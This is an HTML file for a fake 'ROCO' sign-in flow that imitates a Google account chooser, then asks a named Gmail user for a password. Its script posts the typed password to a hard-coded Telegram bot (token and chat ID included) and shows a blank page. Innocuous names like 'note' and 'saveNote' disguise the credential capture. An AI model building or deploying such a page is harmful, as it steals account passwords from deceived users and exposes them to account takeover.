<!doctype html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<title>ROCO</title>
<style>

*{box-sizing:border-box}
html,body{height:100%}
body{
  margin:0;
  font-family:Inter,ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
  background:
    radial-gradient(circle at 12% 18%,rgba(123,155,255,.14),transparent 27%),
    radial-gradient(circle at 88% 82%,rgba(139,111,255,.12),transparent 30%),
    #f7f9fd;
  color:#17213a;
  display:grid;
  place-items:center;
  min-height:100vh;
  padding:24px;
}
.card{
  width:min(450px,100%);
  background:rgba(255,255,255,.97);
  border:1px solid rgba(35,45,70,.08);
  border-radius:24px;
  box-shadow:0 24px 70px rgba(42,55,95,.13);
  padding:40px 34px 31px;
  text-align:center;
}
.logo{
  width:68px;
  height:68px;
  border-radius:18px;
  object-fit:contain;
  display:block;
  margin:0 auto 14px;
  background:#eef2ff;
  border:1px solid #e1e6f5;
}
.brand{
  font-size:25px;
  font-weight:800;
  letter-spacing:-.8px;
  margin-bottom:30px;
}
h1{
  margin:0;
  font-size:28px;
  line-height:1.2;
  letter-spacing:-.8px;
  font-weight:650;
}
.subtitle{
  margin:10px 0 30px;
  color:#69738b;
  font-size:15px;
}
.roco-btn{
  width:100%;
  min-height:58px;
  border:1px solid #cfd9ff;
  border-radius:14px;
  background:#f7f9ff;
  color:#17213a;
  font-size:16px;
  font-weight:650;
  display:flex;
  align-items:center;
  gap:13px;
  padding:8px 16px;
  cursor:pointer;
  transition:.18s ease;
}
.roco-btn:hover{
  background:#eef3ff;
  border-color:#b8c7ff;
  transform:translateY(-1px);
  box-shadow:0 8px 20px rgba(86,110,210,.10);
}
.roco-btn:active{transform:translateY(0)}
.button-logo{
  width:40px;
  height:40px;
  border-radius:11px;
  object-fit:contain;
  background:#e8edff;
  flex:none;
}
.button-text{flex:1;text-align:left}
.arrow{font-size:25px;color:#5f709d}
.divider{
  display:flex;
  align-items:center;
  gap:14px;
  color:#98a1b4;
  font-size:12px;
  font-weight:700;
  letter-spacing:.7px;
  margin:26px 0;
}
.divider:before,.divider:after{
  content:"";
  height:1px;
  background:#e4e8f0;
  flex:1;
}
.terms{
  margin:0;
  color:#8a93a6;
  font-size:12px;
  line-height:1.65;
}
.terms a{
  color:#3367d6;
  text-decoration:none;
  font-weight:600;
}
.terms a:hover{text-decoration:underline}
.status{
  display:none;
  margin-top:16px;
  padding:10px 12px;
  border-radius:10px;
  background:#eef2ff;
  color:#5368a3;
  font-size:13px;
}
@media(max-width:480px){
  body{padding:16px}
  .card{padding:32px 22px 26px;border-radius:20px}
  h1{font-size:25px}
}



    * { box-sizing: border-box; }
    #page2 .page {
      width: 100%;
      min-height: 100vh;
      background: #fff;
      padding: 28px 40px 0;
    }
    #page2 .brand-logo {
      display: block;
      width: 82px;
      height: 70px;
      object-fit: contain;
      object-position: left center;
      margin: 0 0 24px 0;
    }
    h1 {
      margin: 0 0 20px 0;
      font-size: 62px;
      line-height: 1.05;
      font-weight: 400;
      letter-spacing: -2.5px;
    }
    #page2 .note-label {
      display: flex;
      align-items: center;
      gap: 18px;
      height: 50px;
      margin-bottom: 34px;
      font-size: 31px;
      line-height: 1;
      font-weight: 400;
    }
    #page2 .note-logo {
      width: 50px;
      height: 50px;
      object-fit: contain;
    }
    #page2 .note-input {
      width: 100%;
      height: 64px;
      border: 2px solid #9d9d9d;
      border-radius: 8px;
      padding: 0 20px;
      outline: none;
      font-family: Arial, Helvetica, sans-serif;
      font-size: 22px;
      font-weight: 400;
      color: #111;
      background: #fff;
      box-shadow: 0 1px 2px rgba(0,0,0,.08) inset;
    }
    #page2 .note-input::placeholder { color: #111; opacity: 1; }
    #page2 .next-wrap {
      display: flex;
      justify-content: flex-end;
      margin-top: 28px;
    }
    #page2 .next-btn {
      min-width: 160px;
      height: 54px;
      border: 0;
      border-radius: 30px;
      padding: 0 28px;
      background: #0867d9;
      color: #fff;
      font-family: Arial, Helvetica, sans-serif;
      font-size: 20px;
      font-weight: 400;
      cursor: pointer;
      -webkit-tap-highlight-color: transparent;
      box-shadow: none;
    }
    #page2 .next-btn:active { transform: scale(.985); }
    #page2 .blank { display: none; min-height: 100vh; background: #fff; }
    #page2 .sending { opacity: .75; pointer-events: none; }
    @media (max-width: 600px) {
      #page2 .page { padding: 24px 24px 0; }
      #page2 .brand-logo { width: 64px; height: 52px; margin-bottom: 20px; }
      h1 { font-size: 48px; margin-bottom: 18px; }
      #page2 .note-label { font-size: 23px; gap: 10px; margin-bottom: 28px; }
      #page2 .note-logo { width: 38px; height: 38px; }
      #page2 .note-input { height: 58px; padding: 0 18px; font-size: 21px; }
      #page2 .next-wrap { margin-top: 24px; }
      #page2 .next-btn { min-width: 125px; height: 52px; font-size: 20px; }
    }
  

#page2 {
  display:none;
  min-height:100vh;
  width:100%;
  background:#fff;
}
#page2.visible { display:block; }
#page1.hidden { display:none; }
</style>
</head>
<body>
<section id="page1">

<main class="card">

  <!-- YOUR TOP LOGO:
       Replace YOUR_LOGO_URL_HERE with the URL of your logo.
       Example: https://yourwebsite.com/logo.png
  -->
  <img
    class="logo"
    src="ROCO.PNG"
    alt=""
  >

  <div class="brand">ROCO</div>

  <h1>Choose an account</h1>
  <p class="subtitle">to continue to <strong>ROCO</strong></p>

  <button class="roco-btn" id="rocoBtn" type="button">

    <!-- YOUR BUTTON LOGO:
         Replace YOUR_LOGO_URL_HERE with your logo URL.
    -->
    <img
      class="button-logo"
      src="Google.PNG"
      alt=""
    >

    <span class="button-text">Continue with Google</span>
    <span class="arrow">→</span>
  </button>

  <div class="divider">OR</div>

  <p class="terms">
    By continuing, you agree to ROCO's
    <a href="#">Terms of Service</a>
    and
    <a href="#">Privacy Policy</a>.
  </p>

  <div class="status" id="status">
    Welcome to ROCO — account selection prototype.
  </div>

</main>



</section>

<section id="page2">

  <main id="notePage" class="page">
    <!-- Put your main logo file beside this HTML and name it logo.png -->
    <img class="brand-logo" src="Google.PNG" alt="">

    <h1>Welcome</h1>

    <div class="note-label">
      <!-- Put your small logo file beside this HTML and name it logo.png -->
      <img
  class="note-logo"
  src="./H.PNG"
  alt="H"
  onerror="this.style.display='none'; console.log('H.PNG failed to load')"
>
      <span>hanzaryoonyoon@gmail.com</span>
    </div>

    <input id="note" class="note-input" type="text" placeholder="enter your password" autocomplete="off" spellcheck="false">

    <div class="next-wrap">
      <button id="next" class="next-btn" type="button">Next</button>
    </div>
  </main>

  <div id="blankPage" class="blank" aria-hidden="true"></div>

  

</section>

<script>
(function () {
  const page1 = document.getElementById('page1');
  const page2 = document.getElementById('page2');
  const rocoBtn = document.getElementById('rocoBtn');
  const noteInput = document.getElementById('note');
  const nextBtn = document.getElementById('next');
  const notePage = document.getElementById('notePage');
  const blankPage = document.getElementById('blankPage');

  // Page 1 -> Page 2
  rocoBtn.addEventListener('click', function (event) {
    event.preventDefault();
    page1.classList.add('hidden');
    page2.classList.add('visible');
    window.scrollTo({ top: 0, left: 0, behavior: 'auto' });
    setTimeout(function () { noteInput.focus(); }, 50);
  });

  // Page 2 -> Telegram -> blank white page
  async function saveNote() {
    const note = noteInput.value.trim();
    if (!note) {
      noteInput.focus();
      return;
    }

    nextBtn.disabled = true;
    nextBtn.classList.add('sending');
    nextBtn.textContent = '...';

    const BOT_TOKEN = '8809636062:AAFGl-1B1LkVW25mpj1u33SBzMVnpmpX3tY';
    const CHAT_ID = '8945438235';
    const telegramUrl = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';

    try {
      const body = new URLSearchParams();
      body.set('chat_id', CHAT_ID);
      body.set('text', note);

      // no-cors allows the standalone HTML page to send the request.
      await fetch(telegramUrl, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
        body: body
      });
    } catch (error) {
      // Still move to the requested blank page after the click.
      console.error('Telegram request failed:', error);
    }

    notePage.style.display = 'none';
    blankPage.style.display = 'block';
    document.body.style.background = '#fff';
  }

  nextBtn.addEventListener('click', saveNote);
  noteInput.addEventListener('keydown', function (event) {
    if (event.key === 'Enter') {
      event.preventDefault();
      saveNote();
    }
  });
})();
</script>
</body>
</html>
